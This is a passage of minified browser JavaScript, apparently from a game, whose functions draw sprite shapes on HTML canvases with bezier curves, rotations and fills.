                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(118 * e, 100 * e),
                    r.bezierCurveTo(118 * e, 205 * e, 118 * e, 207 * e, 118 * e, 200 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(183 * e, 100 * e),
                    r.bezierCurveTo(183 * e, 203 * e, 183 * e, 203 * e, 183 * e, 200 * e),
                    r.closePath(),
                    he(r, void 0, i[2], 8 * e),
                    n
            }
            function wt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 90 * e,
                    n.height = 98 * e,
                    r.translate(0, 4 * e),
                    0 === Ze && (r.globalAlpha = t ? .5 : 1,
                        r.save(),
                        r.translate(44 * e, 50 * e),
                        r.rotate(.2),
                        A(r, 9, 41 * e, 10 * e),
                        r.restore(),
                        he(r, i[0])),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(44 * e, 44 * e),
                    r.rotate(.2),
                    A(r, 9, 41 * e, 10 * e),
                    he(r, i[1], i[2], 4 * e),
                    r.rotate(-.32),
                    A(r, 9, 32 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    r.rotate(.68),
                    A(r, 9, 23 * e, 8 * e),
                    he(r, i[5], i[6], 6 * e),
                    r.restore(),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -9 * e, -25.5 * e, 18 * e, 51 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    r.save(),
                    r.translate(45 * e, 45 * e),
                    r.rotate(0),
                    Ve(r, -26 * e, -9 * e, 52 * e, 18 * e, 30 * e),
                    r.restore(),
                    he(r, i[4], i[4], 2 * e),
                    ke(r, 45 * e, 29 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 45 * e, 61 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 28 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    ke(r, 62 * e, 45 * e, 7 * e),
                    he(r, i[5]),
                    n
            }
            function Wt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 135 * e,
                    n.height = 120 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(3.5 * e, 55.25 * e),
                    r.bezierCurveTo(3.5 * e, 114.25 * e, 2.5 * e, 109.25 * e, 3.5 * e, 112.25 * e),
                    r.bezierCurveTo(5.5 * e, 119.25 * e, 8.5 * e, 119.25 * e, 11.5 * e, 119.25 * e),
                    r.bezierCurveTo(15.5 * e, 114.25 * e, 13.5 * e, 95.25 * e, 14.5 * e, 82.25 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(6.5 * e, 43.25 * e),
                    r.bezierCurveTo(3.5 * e, 27.25 * e, 7.5 * e, 20.25 * e, 25.5 * e, 11.25 * e),
                    r.bezierCurveTo(45.5 * e, -.75 * e, 73.5 * e, 1.25 * e, 107.5 * e, 10.25 * e),
                    r.bezierCurveTo(131.5 * e, 21.25 * e, 125.5 * e, 34.25 * e, 125.5 * e, 36.25 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(120.5 * e, 62.25 * e),
                    r.bezierCurveTo(121.5 * e, 95.25 * e, 120.5 * e, 80.25 * e, 120.5 * e, 100.25 * e),
                    r.bezierCurveTo(118.5 * e, 119.25 * e, 123.5 * e, 118.25 * e, 129.5 * e, 113.25 * e),
                    r.bezierCurveTo(133.5 * e, 107.25 * e, 130.5 * e, 97.25 * e, 130.5 * e, 87.25 * e),
                    r.bezierCurveTo(129.5 * e, 56.25 * e, 130 * e, 70.75 * e, 129.5 * e, 54.25 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 7 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(17.5 * e, 27 * e),
                    r.bezierCurveTo(48.5 * e, 5 * e, 93.5 * e, 14 * e, 118.5 * e, 26 * e),
                    r.bezierCurveTo(132.5 * e, 35 * e, 133.5 * e, 52 * e, 132.5 * e, 68 * e),
                    r.bezierCurveTo(125.5 * e, 87 * e, 116.5 * e, 84 * e, 96.5 * e, 75 * e),
                    r.bezierCurveTo(60.5 * e, 66 * e, 52.5 * e, 74 * e, 37.5 * e, 78 * e),
                    r.bezierCurveTo(2.5 * e, 86 * e, 3.5 * e, 78 * e, 1.5 * e, 61 * e),
                    r.bezierCurveTo(1.5 * e, 37 * e, 9.5 * e, 32 * e, 15.5 * e, 28 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 7 * e),
                    n
            }
            function Vt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 501 * e,
                    n.height = 309 * e,
                    r.translate(0, 6 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(126 * e, 184 * e),
                    r.bezierCurveTo(169 * e, 196 * e, 194 * e, 198 * e, 227 * e, 198 * e),
                    r.bezierCurveTo(235 * e, 222 * e, 236 * e, 223 * e, 241 * e, 226 * e),
                    r.bezierCurveTo(245 * e, 228 * e, 257 * e, 228 * e, 263 * e, 226 * e),
                    r.bezierCurveTo(267 * e, 225 * e, 270 * e, 211 * e, 275 * e, 198 * e),
                    r.bezierCurveTo(332 * e, 194 * e, 347 * e, 192 * e, 372 * e, 188 * e),
                    r.bezierCurveTo(366 * e, 174.5 * e, 366 * e, 174.5 * e, 360 * e, 161 * e),
                    r.bezierCurveTo(253.5 * e, 162 * e, 253.5 * e, 162 * e, 147 * e, 163 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(100 * e, 116 * e),
                    r.bezierCurveTo(90 * e, 101 * e, 96 * e, 89 * e, 106 * e, 83 * e),
                    r.bezierCurveTo(86 * e, 79 * e, 86 * e, 52 * e, 93 * e, 38 * e),
                    r.bezierCurveTo(99 * e, 51 * e, 107 * e, 57 * e, 122 * e, 63 * e),
                    r.bezierCurveTo(130 * e, 53 * e, 141 * e, 46 * e, 161 * e, 46 * e),
                    r.bezierCurveTo(157 * e, 31 * e, 158 * e, 20 * e, 169 * e, 6 * e),
                    r.bezierCurveTo(171 * e, 24 * e, 186 * e, 33 * e, 198 * e, 45 * e),
                    r.bezierCurveTo(252 * e, 45 * e, 252 * e, 45 * e, 306 * e, 45 * e),
                    r.bezierCurveTo(323 * e, 33 * e, 332 * e, 21 * e, 335 * e, 7 * e),
                    r.bezierCurveTo(349 * e, 21 * e, 347 * e, 36 * e, 345 * e, 46 * e),
                    r.bezierCurveTo(364 * e, 46 * e, 369 * e, 48 * e, 377 * e, 63 * e),
                    r.bezierCurveTo(398 * e, 58 * e, 403 * e, 49 * e, 409 * e, 40 * e),
                    r.bezierCurveTo(419 * e, 57 * e, 411 * e, 79 * e, 398 * e, 85 * e),
                    r.bezierCurveTo(405 * e, 100 * e, 405 * e, 106 * e, 401 * e, 118 * e),
                    r.bezierCurveTo(332.5 * e, 128.5 * e, 332.5 * e, 128.5 * e, 264 * e, 139 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(122 * e, 191 * e),
                    r.bezierCurveTo(123 * e, 237 * e, 135 * e, 245 * e, 153 * e, 259 * e),
                    r.bezierCurveTo(167 * e, 269 * e, 158 * e, 281 * e, 118 * e, 276 * e),
                    r.bezierCurveTo(104 * e, 273 * e, 98 * e, 268 * e, 93 * e, 242 * e),
                    r.bezierCurveTo(89 * e, 220 * e, 92 * e, 201 * e, 102 * e, 179 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(403 * e, 182 * e),
                    r.bezierCurveTo(414 * e, 215 * e, 412 * e, 232 * e, 403 * e, 260 * e),
                    r.bezierCurveTo(395 * e, 274 * e, 375 * e, 272 * e, 356 * e, 270 * e),
                    r.bezierCurveTo(345 * e, 268 * e, 339 * e, 262 * e, 354 * e, 252 * e),
                    r.bezierCurveTo(370 * e, 242 * e, 380 * e, 225 * e, 384 * e, 184 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(155 * e, 157 * e),
                    r.bezierCurveTo(146 * e, 189 * e, 137 * e, 198 * e, 114 * e, 219 * e),
                    r.bezierCurveTo(104 * e, 212 * e, 98 * e, 203 * e, 89 * e, 189 * e),
                    r.bezierCurveTo(82 * e, 178 * e, 91 * e, 164 * e, 93 * e, 136 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(347 * e, 162 * e),
                    r.bezierCurveTo(357 * e, 195 * e, 376 * e, 209 * e, 387 * e, 217 * e),
                    r.bezierCurveTo(409 * e, 201 * e, 420 * e, 181 * e, 416 * e, 166 * e),
                    r.bezierCurveTo(410 * e, 150 * e, 412 * e, 149 * e, 408 * e, 130 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(86 * e, 134 * e),
                    r.bezierCurveTo(79 * e, 102 * e, 92 * e, 84 * e, 108 * e, 92 * e),
                    r.bezierCurveTo(149 * e, 108 * e, 184 * e, 111 * e, 242 * e, 111 * e),
                    r.bezierCurveTo(294 * e, 108 * e, 341 * e, 105 * e, 386 * e, 98 * e),
                    r.bezierCurveTo(412 * e, 91 * e, 417 * e, 86 * e, 415 * e, 133 * e),
                    r.bezierCurveTo(413 * e, 160 * e, 413 * e, 160 * e, 368 * e, 174 * e),
                    r.bezierCurveTo(308 * e, 184 * e, 291 * e, 185 * e, 270 * e, 186 * e),
                    r.bezierCurveTo(264 * e, 206 * e, 262 * e, 215 * e, 253 * e, 215 * e),
                    r.bezierCurveTo(239 * e, 217 * e, 239 * e, 211 * e, 231 * e, 186 * e),
                    r.bezierCurveTo(178 * e, 184 * e, 156 * e, 179 * e, 112 * e, 162 * e),
                    r.bezierCurveTo(87 * e, 151 * e, 90 * e, 144 * e, 87 * e, 137 * e),
                    r.closePath(),
                    he(r, i[4], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(63 * e, 98 * e),
                    r.bezierCurveTo(84 * e, 121 * e, 109 * e, 102 * e, 124 * e, 117 * e),
                    r.bezierCurveTo(138 * e, 136 * e, 123 * e, 165 * e, 94 * e, 150 * e),
                    r.bezierCurveTo(66 * e, 131 * e, 64 * e, 115 * e, 63 * e, 99 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(449 * e, 97 * e),
                    r.bezierCurveTo(446 * e, 143 * e, 415 * e, 151 * e, 402 * e, 155 * e),
                    r.bezierCurveTo(386 * e, 157 * e, 373 * e, 133 * e, 391 * e, 116 * e),
                    r.bezierCurveTo(402 * e, 106 * e, 432 * e, 124 * e, 449 * e, 97 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 10 * e),
                    n
            }
            function kt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 304 * e,
                    n.height = 278 * e,
                    r.translate(10 * e, 25 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(128 * e, 137 * e),
                    r.bezierCurveTo(155 * e, 144 * e, 223 * e, 143 * e, 256 * e, 122 * e),
                    r.bezierCurveTo(249 * e, 180 * e, 210 * e, 227 * e, 164 * e, 242 * e),
                    r.bezierCurveTo(74 * e, 213 * e, 99 * e, 166 * e, 127 * e, 138 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(284 * e, 52 * e),
                    r.bezierCurveTo(126 * e, 112 * e, 89 * e, 177 * e, 170 * e, 241 * e),
                    r.bezierCurveTo(103 * e, 275 * e, 20 * e, 239 * e, 12 * e, 159 * e),
                    r.bezierCurveTo(5 * e, 76 * e, 75 * e, 4 * e, 165 * e, 13 * e),
                    r.bezierCurveTo(233 * e, 15 * e, 260 * e, 33 * e, 284 * e, 52 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-10 * e, -25 * e),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(128 * e, 137 * e),
                    r.bezierCurveTo(155 * e, 144 * e, 223 * e, 143 * e, 256 * e, 122 * e),
                    r.bezierCurveTo(249 * e, 180 * e, 210 * e, 227 * e, 164 * e, 242 * e),
                    r.bezierCurveTo(74 * e, 213 * e, 99 * e, 166 * e, 127 * e, 138 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 15 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(284 * e, 52 * e),
                    r.bezierCurveTo(126 * e, 112 * e, 89 * e, 177 * e, 170 * e, 241 * e),
                    r.bezierCurveTo(103 * e, 275 * e, 20 * e, 239 * e, 12 * e, 159 * e),
                    r.bezierCurveTo(5 * e, 76 * e, 75 * e, 4 * e, 165 * e, 13 * e),
                    r.bezierCurveTo(233 * e, 15 * e, 260 * e, 33 * e, 284 * e, 52 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 15 * e),
                    n
            }
            function Kt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 175 * e,
                    n.height = 169 * e,
                    r.globalAlpha = .5,
                    r.translate(0, 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(19 * e, 139 * e),
                    r.bezierCurveTo(18 * e, 163 * e, 22 * e, 156 * e, 53 * e, 157 * e),
                    r.bezierCurveTo(97.5 * e, 157 * e, 97.5 * e, 157 * e, 142 * e, 157 * e),
                    r.bezierCurveTo(150 * e, 157 * e, 153 * e, 156 * e, 154 * e, 142 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -3 * e),
                    r.save(),
                    r.translate(86.5 * e, 81.5 * e),
                    Ve(r, -66.5 * e, -65.5 * e, 133 * e, 131 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.save(),
                    r.translate(84.5 * e, 79 * e),
                    Ve(r, -50.5 * e, -49 * e, 101 * e, 98 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42 * e, 54 * e),
                    r.bezierCurveTo(37 * e, 48 * e, 39 * e, 44 * e, 38 * e, 41 * e),
                    r.bezierCurveTo(42 * e, 40 * e, 45 * e, 40 * e, 50 * e, 41 * e),
                    r.bezierCurveTo(85 * e, 36 * e, 98 * e, 37 * e, 116 * e, 42 * e),
                    r.bezierCurveTo(132 * e, 39 * e, 132 * e, 39 * e, 133 * e, 56 * e),
                    r.bezierCurveTo(136 * e, 73 * e, 136 * e, 84 * e, 132 * e, 106 * e),
                    r.bezierCurveTo(47 * e, 113 * e, 85.5 * e, 106 * e, 39 * e, 106 * e),
                    r.bezierCurveTo(32 * e, 81 * e, 38 * e, 60 * e, 42 * e, 55 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.save(),
                    r.translate(28 * e, 24 * e),
                    r.rotate(0),
                    Ve(r, -14 * e, -14 * e, 28 * e, 28 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.save(),
                    r.translate(143 * e, 23 * e),
                    r.rotate(0),
                    Ve(r, -14 * e, -14 * e, 28 * e, 28 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 80 * e),
                    r.bezierCurveTo(73 * e, 78 * e, 84 * e, 74 * e, 100 * e, 64 * e),
                    r.bezierCurveTo(111 * e, 57 * e, 125 * e, 67 * e, 108 * e, 84 * e),
                    r.bezierCurveTo(96 * e, 95 * e, 86 * e, 96 * e, 70 * e, 88 * e),
                    r.bezierCurveTo(62.5 * e, 84 * e, 62.5 * e, 84 * e, 55 * e, 80 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(17 * e, 112 * e),
                    r.bezierCurveTo(14 * e, 146 * e, 27 * e, 152 * e, 37 * e, 149 * e),
                    r.bezierCurveTo(78 * e, 155 * e, 128 * e, 150 * e, 146 * e, 150 * e),
                    r.bezierCurveTo(158 * e, 144 * e, 158 * e, 121 * e, 153 * e, 114 * e),
                    r.closePath(),
                    he(r, i[8], i[9], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(127 * e, 111 * e),
                    r.bezierCurveTo(133 * e, 136 * e, 115 * e, 149 * e, 88 * e, 150 * e),
                    r.bezierCurveTo(119.5 * e, 151 * e, 119.5 * e, 151 * e, 151 * e, 152 * e),
                    r.bezierCurveTo(159 * e, 136 * e, 155 * e, 126 * e, 154 * e, 113 * e),
                    r.closePath(),
                    he(r, i[9]),
                    r.globalAlpha = .5,
                    r.translate(0, 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(15 * e, 117 * e),
                    r.bezierCurveTo(34 * e, 109 * e, 61 * e, 106 * e, 94 * e, 109 * e),
                    r.bezierCurveTo(126 * e, 110 * e, 142 * e, 113 * e, 154 * e, 119 * e),
                    r.bezierCurveTo(154 * e, 123 * e, 154 * e, 123 * e, 154 * e, 127 * e),
                    r.bezierCurveTo(127 * e, 118 * e, 15 * e, 122 * e, 18 * e, 129 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(14 * e, 127 * e),
                    r.bezierCurveTo(13 * e, 117 * e, 12 * e, 109 * e, 15 * e, 103 * e),
                    r.bezierCurveTo(16 * e, 95 * e, 21 * e, 92 * e, 60 * e, 93 * e),
                    r.bezierCurveTo(91 * e, 93 * e, 118 * e, 93 * e, 143 * e, 96 * e),
                    r.bezierCurveTo(151 * e, 96 * e, 155 * e, 99 * e, 156 * e, 112 * e),
                    r.bezierCurveTo(157 * e, 124 * e, 157 * e, 127 * e, 156 * e, 128 * e),
                    r.bezierCurveTo(138 * e, 112 * e, 100 * e, 118 * e, 84 * e, 118 * e),
                    r.bezierCurveTo(28 * e, 118 * e, 20 * e, 120 * e, 16 * e, 127 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.save(),
                    r.translate(27.5 * e, 138.5 * e),
                    Ve(r, -13.5 * e, -14.5 * e, 27 * e, 29 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.save(),
                    r.translate(143.5 * e, 137 * e),
                    Ve(r, -13.5 * e, -14 * e, 27 * e, 28 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    n
            }
            function Ut(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 175 * e,
                    n.height = 169 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(17 * e, 112 * e),
                    r.bezierCurveTo(14 * e, 146 * e, 27 * e, 152 * e, 37 * e, 149 * e),
                    r.bezierCurveTo(78 * e, 155 * e, 128 * e, 150 * e, 146 * e, 150 * e),
                    r.bezierCurveTo(158 * e, 144 * e, 158 * e, 121 * e, 153 * e, 114 * e),
                    r.closePath(),
                    he(r, i[8], i[9], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(127 * e, 111 * e),
                    r.bezierCurveTo(133 * e, 136 * e, 115 * e, 149 * e, 88 * e, 150 * e),
                    r.bezierCurveTo(119.5 * e, 151 * e, 119.5 * e, 151 * e, 151 * e, 152 * e),
                    r.bezierCurveTo(159 * e, 136 * e, 155 * e, 126 * e, 154 * e, 113 * e),
                    r.closePath(),
                    he(r, i[9]),
                    r.globalAlpha = .5,
                    r.translate(0, 3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(15 * e, 117 * e),
                    r.bezierCurveTo(34 * e, 109 * e, 61 * e, 106 * e, 94 * e, 109 * e),
                    r.bezierCurveTo(126 * e, 110 * e, 142 * e, 113 * e, 154 * e, 119 * e),
                    r.bezierCurveTo(154 * e, 123 * e, 154 * e, 123 * e, 154 * e, 127 * e),
                    r.bezierCurveTo(127 * e, 118 * e, 15 * e, 122 * e, 18 * e, 129 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -3 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(14 * e, 127 * e),
                    r.bezierCurveTo(13 * e, 117 * e, 12 * e, 109 * e, 15 * e, 103 * e),
                    r.bezierCurveTo(16 * e, 95 * e, 21 * e, 92 * e, 60 * e, 93 * e),
                    r.bezierCurveTo(91 * e, 93 * e, 118 * e, 93 * e, 143 * e, 96 * e),
                    r.bezierCurveTo(151 * e, 96 * e, 155 * e, 99 * e, 156 * e, 112 * e),
                    r.bezierCurveTo(157 * e, 124 * e, 157 * e, 127 * e, 156 * e, 128 * e),
                    r.bezierCurveTo(138 * e, 112 * e, 100 * e, 118 * e, 84 * e, 118 * e),
                    r.bezierCurveTo(28 * e, 118 * e, 20 * e, 120 * e, 16 * e, 127 * e),
                    r.closePath(),
                    he(r, i[4], i[5], 5 * e),
                    r.save(),
                    r.translate(27.5 * e, 138.5 * e),
                    Ve(r, -13.5 * e, -14.5 * e, 27 * e, 29 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.save(),
                    r.translate(143.5 * e, 137 * e),
                    Ve(r, -13.5 * e, -14 * e, 27 * e, 28 * e, 4 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    n
            }
            function Yt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 115 * e,
                    n.height = 585 * e,
                    r.scale(-1, 1),
                    r.translate(-110 * e, 0),
                    r.translate(10 * e, 10 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(51.5 * e, 342 * e),
                    Ve(r, -14.5 * e, -225 * e, 29 * e, 450 * e, 20 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(54 * e, 83 * e),
                    r.bezierCurveTo(70 * e, 69 * e, 78 * e, 62 * e, 82 * e, 40 * e),
                    r.bezierCurveTo(93 * e, 48 * e, 103 * e, 64 * e, 95 * e, 102 * e),
                    r.bezierCurveTo(60 * e, 114 * e, 53 * e, 103 * e, 54 * e, 85 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(95 * e, 97 * e),
                    r.bezierCurveTo(56 * e, 102 * e, 43 * e, 77 * e, 71 * e, 6 * e),
                    r.bezierCurveTo(34 * e, 10 * e, 6 * e, 43 * e, 5 * e, 76 * e),
                    r.bezierCurveTo(4 * e, 98 * e, 15 * e, 130 * e, 64 * e, 130 * e),
                    r.bezierCurveTo(76 * e, 129 * e, 95 * e, 113 * e, 97 * e, 97 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(55 * e, 176 * e),
                    r.bezierCurveTo(74 * e, 175 * e, 82 * e, 169 * e, 96 * e, 155 * e),
                    r.bezierCurveTo(103 * e, 183 * e, 95 * e, 214 * e, 54 * e, 219 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(50 * e, 176 * e),
                    r.bezierCurveTo(25 * e, 177 * e, 16 * e, 164 * e, 7 * e, 156 * e),
                    r.bezierCurveTo(0 * e, 186 * e, 10 * e, 201 * e, 43 * e, 220 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 403 * e),
                    r.bezierCurveTo(47 * e, 412 * e, 58 * e, 412 * e, 67 * e, 403 * e),
                    r.bezierCurveTo(66.5 * e, 434 * e, 66.5 * e, 434 * e, 66 * e, 465 * e),
                    r.bezierCurveTo(56 * e, 480 * e, 40 * e, 472 * e, 36 * e, 465 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(59 * e, 67 * e),
                    r.bezierCurveTo(47 * e, 97 * e, 18 * e, 117 * e, 11 * e, 110 * e),
                    r.bezierCurveTo(11 * e, 115 * e, 15 * e, 122 * e, 23 * e, 124 * e),
                    r.bezierCurveTo(46 * e, 118 * e, 52 * e, 113 * e, 62 * e, 86 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 125 * e),
                    r.bezierCurveTo(47 * e, 136 * e, 57 * e, 134 * e, 77 * e, 127 * e),
                    r.bezierCurveTo(71 * e, 158 * e, 71 * e, 159 * e, 66 * e, 159 * e),
                    r.bezierCurveTo(50.5 * e, 156.5 * e, 50.5 * e, 156.5 * e, 35 * e, 154 * e),
                    r.bezierCurveTo(31 * e, 145 * e, 31 * e, 136 * e, 31 * e, 125 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 171 * e),
                    r.bezierCurveTo(32 * e, 221 * e, 43 * e, 233 * e, 70 * e, 247 * e),
                    r.bezierCurveTo(75 * e, 234 * e, 75 * e, 230 * e, 72 * e, 221 * e),
                    r.bezierCurveTo(48 * e, 206 * e, 54 * e, 188 * e, 50 * e, 176 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(60 * e, 68 * e),
                    r.bezierCurveTo(63 * e, 69 * e, 65 * e, 71 * e, 67 * e, 77 * e),
                    r.bezierCurveTo(61 * e, 123 * e, 52 * e, 137 * e, 42 * e, 150 * e),
                    r.bezierCurveTo(38 * e, 151 * e, 38 * e, 151 * e, 34 * e, 152 * e),
                    r.bezierCurveTo(33 * e, 146.5 * e, 33 * e, 146.5 * e, 32 * e, 141 * e),
                    r.bezierCurveTo(49 * e, 118 * e, 63 * e, 87 * e, 59 * e, 68 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(71 * e, 172 * e),
                    r.bezierCurveTo(56 * e, 222 * e, 49 * e, 234 * e, 35 * e, 248 * e),
                    r.bezierCurveTo(30 * e, 236 * e, 30 * e, 230 * e, 31 * e, 217 * e),
                    r.bezierCurveTo(44 * e, 202 * e, 49 * e, 191 * e, 52 * e, 172 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 151 * e),
                    r.bezierCurveTo(27 * e, 165 * e, 31 * e, 173 * e, 36 * e, 178 * e),
                    r.bezierCurveTo(56 * e, 185 * e, 73 * e, 184 * e, 71 * e, 170 * e),
                    r.bezierCurveTo(72 * e, 154 * e, 71 * e, 154 * e, 63 * e, 155 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-10 * e, -10 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(51.5 * e, 342 * e),
                    Ve(r, -14.5 * e, -225 * e, 29 * e, 450 * e, 20 * e),
                    r.restore(),
                    he(r, i[1], i[2], 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(54 * e, 83 * e),
                    r.bezierCurveTo(70 * e, 69 * e, 78 * e, 62 * e, 82 * e, 40 * e),
                    r.bezierCurveTo(93 * e, 48 * e, 103 * e, 64 * e, 95 * e, 102 * e),
                    r.bezierCurveTo(60 * e, 114 * e, 53 * e, 103 * e, 54 * e, 85 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 6 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(95 * e, 97 * e),
                    r.bezierCurveTo(56 * e, 102 * e, 43 * e, 77 * e, 71 * e, 6 * e),
                    r.bezierCurveTo(34 * e, 10 * e, 6 * e, 43 * e, 5 * e, 76 * e),
